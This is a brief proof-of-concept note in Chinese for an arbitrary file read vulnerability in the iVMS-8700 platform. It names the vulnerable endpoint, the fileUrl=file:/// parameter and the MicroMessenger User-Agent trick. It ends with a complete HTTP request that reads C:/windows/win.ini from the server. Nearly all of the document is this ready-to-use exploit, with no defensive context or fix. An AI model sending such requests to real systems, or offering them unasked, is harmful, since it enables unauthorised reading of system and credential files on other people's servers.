# poc
ivm 8700 平台存在任意文件读取漏洞
接口地址为/eps/triggerSnapshot/download.action
添加参数?fileUrl=file:///
然后修改UA头为MicroMessenger
完整路径例如
GET /eps/triggerSnapshot/download.action?fileUrl=file:///C:/windows/win.ini HTTP/1.1
Host: IP
User-Agent: MicroMessenger
